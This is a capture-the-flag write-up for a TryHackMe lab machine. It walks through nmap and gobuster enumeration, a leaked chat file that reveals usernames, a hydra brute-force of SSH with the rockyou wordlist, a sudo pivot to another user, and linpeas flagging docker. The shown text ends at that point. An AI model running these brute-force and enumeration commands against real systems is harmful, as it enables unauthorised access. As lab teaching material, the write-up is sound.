## Summary

Multistage exploit.

1. Find userids and password hint  
2. Bruteforce SSH  
3. Abuse Docker

Final stage was done by teammate
[gp](https://bigpick.github.io/TodayILearned/).

## Stage 1: Find ports

With most of these [tryhackmes](https://tryhackme.com/) I start with nmap
enumeration:

```  
nmap -Pn -sCV -p22,80 -oN nmap/Basic_10.10.102.97.nmap 10.10.102.97  
Nmap scan report for 10.10.102.97  
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol
2.0)  
| ssh-hostkey:  
|   2048 64:60:d1:e5:39:96:90:b9:3c:72:b0:35:c2:2a:e4:f9 (RSA)  
|   256 3c:07:fb:86:de:65:9b:52:59:70:de:06:2e:58:21:48 (ECDSA)  
|_  256 b7:ed:d9:dd:40:46:b4:dc:c8:c3:5c:a1:28:78:73:f7 (ED25519)  
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))  
|_http-server-header: Apache/2.4.29 (Ubuntu)  
|_http-title: Dimension by HTML5 UP  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
```

SSH and HTTP.

## Stage 2: Checkout website

There was an email form, but that was about it.

1. Fired off Burp Suite crawler and active scanner.  
2. Fired off sqlmap against form.  
3. Fired off gobuster (`gobuster dir -t 50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://${IP} --timeout 30s 2>&1 | tee gobuster.out.1`)

Of the three gobuster produced something useful first:

```

```

Enumerating `/uniqueroot` yielded a file
(`/uniqueroot/wolfie_backup_files/chat.txt`) with the following contents:

```  
Backup Chat Between Wolfie and Elliot:

Elliot: Hi!  
Wolfie: hello.  
Elliot: how's your work going?  
Wolfie: i am still developing site i am currently at initial state.How's your
work going?  
Elliot; Oh okay!. Yeah I am working on restricting the users in the server
using chroot but currently i am also at initial state some commands working
and some still needs to get configured.  
Wolfie: Great! how i check the progress?  
Elliot: If you want to check my progress you can use (/elliot_important_file).  
Wolfie: Thanks!:).

Signing Out...  
```

Great, we have two user names `wolfie` and `elliot`, and yet another link that
leads to `/elliot_important_file/note.txt` with the following:

```  
Wolfie i have added password from rockyou  
```

## Stage 3: Brute force SSH

```bash  
# hydra -L users -P ../rockyou.txt -M ip.txt -t 4 ssh

elliot@wolf_server:~$  
```

We're in.

First thing I typed was `history`:

```  
...  
sudo -u dark /bin/dash  
...  
```

The `sudo` stood out:

```  
$ sudo -u dark /bin/dash  
$ cd /home/dark  
$ ls -l  
total 4  
-rw-r--r-- 1 root root 36 Sep 13 11:50 user.txt  
$ cat user.txt  
flag{user_flag_for_this_challenge}  
```

Not the flag we're looking for.

## Stage 4: Get the flag

I'm going to gloss over what didn't work for me, in short, looking for suids,
trying to brute force wolfie's password, looking for other interesting files
that may have the goods, checking out cron ("time" was in the challenge
title), looking for backups, etc...  the usual stuff.

After all that I just uploaded linpeas, and ran that as elliot and dark.  User
dark flagged `docker` as interesting.
